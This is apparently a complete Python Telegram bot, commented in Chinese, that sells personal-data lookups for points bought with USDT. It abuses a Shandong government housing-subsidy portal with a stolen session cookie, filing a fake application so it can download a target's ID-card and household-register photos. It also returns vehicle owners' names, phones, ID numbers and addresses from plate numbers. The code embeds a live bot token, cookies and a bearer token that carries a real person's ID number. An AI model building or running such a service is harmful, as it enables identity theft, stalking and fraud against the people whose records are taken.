import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
import binascii
import random
import concurrent.futures
import inspect  
import urllib.parse
from Crypto.Cipher import DES3
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# 屏蔽 SSL 证书报警
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'

# 外部接口配置
AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"

# --- 新增：政务接口专属配置 ---
GOV_COOKIE = ".ASPXAUTH=5667F36375B0711EE92DAF9FD07CA48B09F3C438818B82405EF98C5538F63DC86EE1D1A00BCD79251F5B450B5A69900515D6922A61FD024697122F5C7910AC5E145E0C31A46E0D3DE8D408367CBF6B6EF23B38B51E8DFF4D23EC6966013E05301A750DAF12875889E2AD6CB4EC7327D548333109EBD2DA50D577D570B55A05FCD18092FEABA9FA92D91E2C47381E28A3; ASP.NET_SessionId=xrawwvtd11zzdsii4jmvfnod"
DEFAULT_BASE_ID = "20260501-63a2b5f509ca136e"
FIX_NAME = "1"
GOV_ROOT_DIR = "山东"

GOV_HEADERS = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'sec-ch-ua-platform': "\"Windows\"",
    'X-Requested-With': "XMLHttpRequest",
    'sec-ch-ua': "\"Microsoft Edge\";v=\"147\", \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"147\"",
    'sec-ch-ua-mobile': "?0",
    'Sec-Fetch-Site': "same-origin",
    'Sec-Fetch-Mode': "cors",
    'Sec-Fetch-Dest': "empty",
    'Referer': "https://pub.ytfcjy.com/WSBA/Home/IndexPubView/WSBAU",
    'Accept-Language': "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    'Cookie': GOV_COOKIE,
}

bot = telebot.TeleBot(API_TOKEN)
user_points = {}
user_states = {}

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
        except: pass
    return pts

user_points = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

# ================= 2. 功能逻辑 =================

# --- 新增功能：政务照片抓取核心算法组 ---
def gov_step1_submit(user_name, user_id_card, base_id):
    url = "https://pub.ytfcjy.com/DataSaveBase/Save"
    params = {'P': "P_YW_ZFBZ_ZGBAWEBCSSQXX"}
    payload = {
        'IniFields': "", 'IniValues': "", 'ConnValue': "", 'NewData': "0",
        'ID': base_id, 'SQFS': "11", 'XZQCODE': "601482", 'SQRLX': "1",
        'RULELIBID': "ZFBZYT2018-3", 'SQRXX_ID': base_id, 'SQRXX_DID': base_id,
        'SQRXX_XH': "1", 'SQRXX_SFBDHK': "是", 'SQRXX_SFBZRK': "是",
        'SQRXX_RULELIBID': "ZFBZYT2018-3", 'SQRPOXX_ID': f"{base_id}-2",
        'SQRPOXX_DID': base_id, 'SQRPOXX_XH': "2", 'SQRPOXX_GX': "配偶",
        'SQRPOXX_RULELIBID': "ZFBZYT2018-3", 'JKJTNDZSR': "", 'YWLX': "初始申请",
        'SQRQ': time.strftime("%Y-%m-%d"), 'ZFBZDJH': "2026050003", 'XZQ': "莱山区",
        'JDCODE': "601482601498", 'JD': "解甲庄街道办事处", 'SQRXX_XM': "**华",
        'SQRXX_LXDH': "153******99", 'SQRXX_HYZK': "已婚", 'SQRXX_SFZH': "3***************5",
        'SQRXX_CSRQ': "1986-12-05", 'SQRXX_XB': "女", 'SQRXX_MZDM': "19", 'SQRXX_MZ': "黎族",
        'SQRXX_LHRQ': "2023-01-08", 'SQRXX_HJJD': "估计", 'SQRXX_GZDW': "放大后4",
        'SQRXX_WHCDDM': "00", 'SQRXX_WHCD': "大学", 'SQRXX_ZYDM': "1400", 'SQRXX_ZY': "公交行业职工",
        'SQRXX_CJZBH': "", 'SQRXX_CJLX': "", 'SQRXX_CJDJ': "", 'JJRXM': "呃呃",
        'JJRGX': "", 'JJRLXDH': "", 'SQRPOXX_XM': user_name, 'SQRPOXX_SFBZRK': "是",
        'SQRPOXX_FBZRKYY': "", 'SQRPOXX_SFZH': user_id_card, 'SQRPOXX_ZJHM': "",
        'SQRPOXX_CSRQ': "2009-07-05", 'SQRPOXX_LXDH': "15412341234", 'SQRPOXX_XB': "男",
        'SQRPOXX_MZDM': "18", 'SQRPOXX_MZ': "傣族", 'SQRPOXX_LHRQ': "2023-01-30",
        'SQRPOXX_HJJD': "而微软推广", 'SQRPOXX_GZDW': "", 'SQRPOXX_WHCDDM': "10",
        'SQRPOXX_ZYDM': "1500", 'SQRPOXX_CJZBH': "", 'SQRPOXX_CJLX': "", 'SQRPOXX_CJDJ': "",
        'JZDZ': "捣鼓捣鼓", 'DBZH': "", 'ZLFWXZQ': "栖霞市", 'ZLFWZL': "投影机靠圣迭戈",
        'ZLJZMJ': "20", 'ZLYZJ': "2222", 'BTKHH': "中信银行", 'BTYHZH': "2121", 'IsEdit': "1",
        'SQRXX_SFTYSB': "", 'SQRXX_SFGR': "", 'SQRXX_SFCJ': "", 'SQRPOXX_SFBDHK': "",
        'SQRPOXX_SFCJ': "", 'SFDB': "", 'SFLM': "", 'SFYFDX': "", 'SFGYTKRY': ""
    }
    headers = GOV_HEADERS.copy()
    headers['Origin'] = "https://pub.ytfcjy.com"
    try:
        res = requests.post(url, params=params, data=payload, headers=headers, timeout=15)
        return res.status_code == 200
    except: return False

def gov_step2_get_bid(ec_type, base_id):
    url = f"https://pub.ytfcjy.com/ApiData/GetYWDZZZ/{base_id}"
    params = {'ECType': ec_type, '_': str(int(time.time() * 1000))}
    try:
        res = requests.get(url, params=params, headers=GOV_HEADERS, timeout=15)
        data = res.json()
        if data.get("Result") == 1:
            return data.get("Data", "").replace('\\', '')
    except: pass
    return None

def gov_step3_save_bid(base_id, sjcl_id, cert_data):
    url = f"https://pub.ytfcjy.com/ApiData/SaveYWDZZZ/{base_id}"
    params = {'SJCLID': sjcl_id}
    payload = {'DZZZInfo': cert_data}
    headers = GOV_HEADERS.copy()
    headers['Origin'] = "https://pub.ytfcjy.com"
    try:
        res = requests.post(url, params=params, data=payload, headers=headers, timeout=15)
        return res.json().get("Result") == 1
    except: return False

def gov_step4_download(base_id, sjcl_id, user_id_card, save_filename, save_dir):
    url = "https://pub.ytfcjy.com/File/GetScanFileInfoData"
    params = {'Value': sjcl_id, '_': str(int(time.time() * 1000))}
    try:
        res = requests.get(url, params=params, headers=GOV_HEADERS, timeout=15)
        photo_list = res.json()
        os.makedirs(save_dir, exist_ok=True)
        for photo in photo_list:
            name = photo.get("Name", "")
            photo_id = photo.get("ID")
            if name.endswith(f"{user_id_card}.png"):
                img_res = requests.get(f"https://pub.ytfcjy.com/File/OpenCMSFile?PICID={photo_id}", headers=GOV_HEADERS, timeout=20)
                if img_res.status_code == 200:
                    save_path = os.path.join(save_dir, f"{save_filename}.png")
                    with open(save_path, 'wb') as f:
                        f.write(img_res.content)
                    return save_path
    except: pass
    return None

def gov_process_doc(ec_type, base_id, sjcl_id, user_id_card, save_name, save_dir):
    cert = gov_step2_get_bid(ec_type, base_id)
    if not cert: return None
    if not gov_step3_save_bid(base_id, sjcl_id, cert): return None
    return gov_step4_download(base_id, sjcl_id, user_id_card, save_name, save_dir)

# --- 新增：证照抓取异步线程分流器 ---
def download_images_async(chat_id, user_id_card, uid):
    wait_msg = bot.send_message(chat_id, "⏳ 正在提取电子证照，请稍候...")
    
    # 扣除 20 积分
    user_points[uid] -= 20.0
    save_points()

    id_dir = os.path.join(GOV_ROOT_DIR, user_id_card)
    base_id = DEFAULT_BASE_ID

    try:
        # Step 1: 提交
        if not gov_step1_submit(FIX_NAME, user_id_card, base_id):
            raise Exception("政务网节点请求建立失败")

        # Step 2-4: 提取身份证
        sfz_path = gov_process_doc("SFZ", base_id, f"{base_id}-1", user_id_card, "身份证", id_dir)
        # Step 2-4: 提取户口簿
        hkb_path = gov_process_doc("HKB", base_id, f"{base_id}-2", user_id_card, "户口簿", id_dir)

        bot.delete_message(chat_id, wait_msg.message_id)

        success_count = 0
        # 发送图片到群/私聊
        for path, title in [(sfz_path, "身份证电子照"), (hkb_path, "户口簿电子照")]:
            if path and os.path.exists(path):
                with open(path, 'rb') as f:
                    bot.send_photo(chat_id, f, caption=f"✨ {title} 获取成功！")
                success_count += 1
            else:
                bot.send_message(chat_id, f"❌ 未获取到与之关联的 {title}。")

        if success_count > 0:
            bot.send_message(chat_id, f"✅ 证照抓取完毕。\n<b>已扣除 20.00 积分!</b>\n<b>当前余额: {user_points[uid]:.2f}</b>", parse_mode='HTML')
        else:
            # 彻底没有成功获取图片，返还积分
            user_points[uid] += 20.0
            save_points()
            bot.send_message(chat_id, f"⚠️ 未获取到任何有效的关联影像。由于未查出数据，已为您自动返还 20 积分。\n<b>当前余额: {user_points[uid]:.2f}</b>", parse_mode='HTML')

    except Exception as e:
        # 异常退款
        user_points[uid] += 20.0
        save_points()
        bot.delete_message(chat_id, wait_msg.message_id)
        bot.send_message(chat_id, f"❌ 电子证照拉取失败: {str(e)}\n积分已退回。\n<b>当前余额: {user_points[uid]:.2f}</b>", parse_mode='HTML')


# --- 原有功能逻辑 ---
def cp_query_logic(chat_id, car_no, uid):
    """车牌查询 - 对接 ovo1.cc 接口"""
    wait_msg = bot.send_message(chat_id, "⏳ 正在查询...")
    base_url = f"https://ovo1.cc/api/car.php?plate={urllib.parse.quote(car_no)}"
    track_url = f"https://ovo1.cc/api/chegui.php?message={urllib.parse.quote(car_no)}"
    try:
        res_base = requests.get(base_url, timeout=15).json()
        if res_base and res_base.get('code') == 200:
            user_points[uid] -= 2.5
            save_points()
            data = res_base.get('data', {})
            result_text = (f"🚗 <b>车牌查询结果: {car_no}</b>\n\n"
                           f"车主姓名:{data.get('name2', '未知')}\n"
                           f"联系电话:{data.get('phone', '未知')}\n"
                           f"身份证号:<code>{data.get('id_card', '未知')}</code>\n"
                           f"联系地址:{data.get('address', '未知')}\n")
            try:
                res_track = requests.get(track_url, timeout=10).json()
                if res_track.get('code') == 200:
                    order_data = res_track.get('data', {}).get('订单信息', {})
                    if order_data:
                        result_text += "\n📑 <b>详细订单信息:</b>\n"
                        for k, v in order_data.items():
                            if v: result_text += f"{k}:{v}\n"
            except: pass
            result_text += (f"\n<b>已扣除 2.5 积分!</b>\n"
                            f"<b>当前余额: {user_points[uid]:.2f}</b>")
            bot.delete_message(chat_id, wait_msg.message_id)
            bot.send_message(chat_id, result_text, parse_mode='HTML')
        else:
            bot.delete_message(chat_id, wait_msg.message_id)
            error_msg = (f"🚗 车牌查询结果:\n\n未匹配到有效车档信息。\n\n"
                         f"查询无结果,未扣除积分。\n"
                         f"<b>当前余额: {user_points[uid]:.2f}</b>")
            bot.send_message(chat_id, error_msg, parse_mode='HTML')
    except Exception as e:
        bot.edit_message_text(f"⚠️ 查询异常: {str(e)}", chat_id, wait_msg.message_id)

def query_3ys_logic(chat_id, name, id_card, phone, uid):
    """三要素核验"""
    wait_msg = bot.send_message(chat_id, "⏳ 正在核验...")
    url = "http://xiaowunb.top/3ys.php"
    params = {"name": name, "sfz": id_card, "sjh": phone}
    try:
        response = requests.get(url, params=params, timeout=15); response.encoding = 'utf-8'
        user_points[uid] -= 0.05; save_points()
        clean_res = re.sub(r'小无 API.*?官方客服:@\w+', '', response.text.strip(), flags=re.DOTALL).strip()
        res_status = "三要素核验成功✅" if ("成功" in clean_res or "一致" in clean_res) else "三要素核验失败❌"
        bot.delete_message(chat_id, wait_msg.message_id)
        bot.send_message(chat_id, f"姓名:{name}\n手机号:{phone}\n身份证:{id_card}\n结果:{res_status}\n\n"
                                  f"<b>已扣除 0.05 积分!</b>\n<b>当前余额:{user_points[uid]:.2f}</b>", parse_mode='HTML')
    except Exception as e: bot.edit_message_text(f"⚠️ 核验异常: {str(e)}", chat_id, wait_msg.message_id)

def single_verify_2ys(chat_id, name, id_card, uid):
    """二要素核验"""
    wait_msg = bot.send_message(chat_id, "⏳ 正在核验...")
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"}
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.01; save_points()
        res_type = "二要素核验一致✅" if r.json().get("success") else "二要素验证失败 ❌"
        bot.delete_message(chat_id, wait_msg.message_id)
        bot.send_message(chat_id, f"姓名: {name}\n身份证: {id_card}\n结果: {res_type}\n\n"
                                  f"<b>已扣除 0.01 积分!</b>\n<b>当前余额:{user_points[uid]:.2f}</b>", parse_mode='HTML')
    except Exception as e: bot.edit_message_text(f"❌ 核验异常: {str(e)}", chat_id, wait_msg.message_id)

# ================= 3. UI 菜单 =================

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"), types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url), types.InlineKeyboardButton("OkPay 充值", url=admin_url), types.InlineKeyboardButton("RMB 充值", url=admin_url), types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (f"<b>Admin@铭</b>\n\n"
            f"<b>用户 ID:</b> <code>{uid}</code>\n"
            f"<b>用户名称:</b> {first_name}\n"
            f"<b>用户名:</b> {username}\n"
            f"<b>当前余额:</b> <code>{pts:.2f}积分</code>\n\n"
            f"<b>使用帮助可查看使用教程</b>\n"
            f"<b>在线充值可支持24小时</b>\n"
            f"<b>1 USDT = 1 积分</b>")

# ================= 4. 消息处理 =================

@bot.message_handler(commands=['start', '3ys', '2ys', 'cp', 'add', 'zz'])
def handle_commands(message):
    uid, chat_id = message.from_user.id, message.chat.id
    cmd_parts = message.text.split()
    cmd = cmd_parts[0][1:]
    current_pts = user_points.get(uid, 0.0)

    if cmd == 'start':
        if uid not in user_points: user_points[uid] = 0.0
        bot.send_message(chat_id, get_main_text(message, uid, user_points[uid]), parse_mode='HTML', reply_markup=get_main_markup())
    elif cmd == '2ys':
        if current_pts < 0.01: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
        bot.send_message(chat_id, "请输入:姓名 身份证"); user_states[chat_id] = {'step': 'v_2ys'}
    elif cmd == '3ys':
        if current_pts < 0.05: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
        bot.send_message(chat_id, "请输入:姓名 身份证 手机号"); user_states[chat_id] = {'step': 'v_3ys'}
    elif cmd == 'cp':
        if current_pts < 2.5: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
        user_states[chat_id] = {'step': 'v_cp'}; bot.send_message(chat_id, "请输入车牌号:")
    # 新增：明确指令触发证照抓取
    elif cmd == 'zz':
        if current_pts < 20.0: return bot.send_message(chat_id, "<b>积分不足 20 积分,请先充值!</b>", parse_mode='HTML')
        bot.send_message(chat_id, "请输入需要提取的18位身份证号:")
        user_states[chat_id] = {'step': 'v_zz'}
    elif cmd == 'add':
        if uid == ADMIN_ID:
            try:
                target_uid = int(cmd_parts[1])
                add_amount = float(cmd_parts[2])
                user_points[target_uid] = user_points.get(target_uid, 0.0) + add_amount
                save_points()
                bot.reply_to(message, f"✅ 充值成功!\n用户 ID: <code>{target_uid}</code>\n充值金额: {add_amount}\n<b>当前总余额: {user_points[target_uid]:.2f} 积分</b>", parse_mode='HTML')
            except Exception as e: bot.reply_to(message, f"❌ 格式错误:/add 用户ID 金额")
        else: bot.reply_to(message, "⛔ 您没有权限访问此命令!")

@bot.message_handler(func=lambda m: True)
def handle_all_text(message):
    uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
    if text.startswith('/'): return
    current_pts = user_points.get(uid, 0.0)
    
    parts = re.split(r'[,,\s\n]+', text)
    
    # 车牌自动识别逻辑
    if re.match(r'^[京津沪渝冀豫云辽黑湖南皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼]{1}[A-Z]{1}[A-Z0-9]{5,6}$', text.upper()):
        if current_pts < 2.5: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
        return cp_query_logic(chat_id, text.upper(), uid)
    
    # 纯18位身份证号自动识别 -> 自动触发 20积分 证照抓取
    if re.match(r'^\d{17}[\dXx]$', text):
        if current_pts < 20.0: return bot.send_message(chat_id, "<b>积分不足 20 积分,无法提取证照!</b>", parse_mode='HTML')
        threading.Thread(target=download_images_async, args=(chat_id, text.upper(), uid)).start()
        return

    # 三要素自动识别
    if len(parts) >= 3:
        n, p, i = None, None, None
        for x in parts:
            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
            elif not p and re.match(r'^1[3-9]\d{9}$', x): p = x
            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
        if n and p and i:
            if current_pts < 0.05: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
            return query_3ys_logic(chat_id, n, i, p, uid)
            
    # 二要素自动识别 -> 识别后连带触发证照抓取 (额外扣除 20 积分)
    if len(parts) == 2:
        n, i = None, None
        for x in parts:
            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
        if n and i:
            if current_pts < 0.01: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
            # 1. 先跑原有的二要素核验
            single_verify_2ys(chat_id, n, i, uid)
            # 2. 刷新最新积分，判断是否够抓取照片
            latest_pts = user_points.get(uid, 0.0)
            if latest_pts >= 20.0:
                threading.Thread(target=download_images_async, args=(chat_id, i, uid)).start()
            else:
                bot.send_message(chat_id, "⚠️ 余额不足 20 积分，自动跳过电子证照提取。")
            return
    
    bot.send_message(chat_id, "⚠️ 无法识别您的输入,请发送 /start 查看可用功能。")

# ================= 5. 回调处理 =================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
    
    if call.data == "view_help":
        help_text = (
            "<b>🛠️ 使用帮助</b>\n"
            "<b>名字-身份证核验 (企业级)</b>\n"
            "<b>全天 24h 秒出 毫秒级响应</b>\n"
            "<b>发送 /2ys 进行核验</b>\n"
            "<b>每次核验扣除 0.01 积分</b>\n"
            "<b>——————————————————</b>\n"
            "<b>名字-手机号-身份证核验 (企业级)</b>\n"
            "<b>全天 24h 秒出 毫秒级响应</b>\n"
            "<b>发送 /3ys 进行核验</b>\n"
            "<b>每次核验扣除 0.05 积分</b>\n"
            "<b>——————————————————</b>\n"
            "<b>车牌号查询</b>\n"
            "<b>发送 /cp 进行查询</b>\n"
            "<b>全天 24h 秒出</b>\n"
            "<b>每次查询扣除 2.5 积分 空不扣除积分</b>\n"
            "<b>——————————————————</b>\n"
            "<b>电子证照提取 (新增)</b>\n"
            "<b>直接发送 18位身份证号 即可自动提取</b>\n"
            "<b>支持提取：身份证正反面、户口簿</b>\n"
            "<b>每次提取扣除 20 积分 (查空全额退款)</b>"
        )
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup(), parse_mode='HTML')
    elif call.data == "view_pay":
        bot.edit_message_text("🛍️ <b>请选择充值方式:</b>\n<b>1 USDT = 1 积分</b>", call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup(), parse_mode='HTML')
    elif call.data == "back_to_main":
        bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=get_main_markup())

if __name__ == '__main__':
    print("Bot 正在运行 (带照片提取+自动扣费20积分)...")
    bot.infinity_polling(timeout=10)
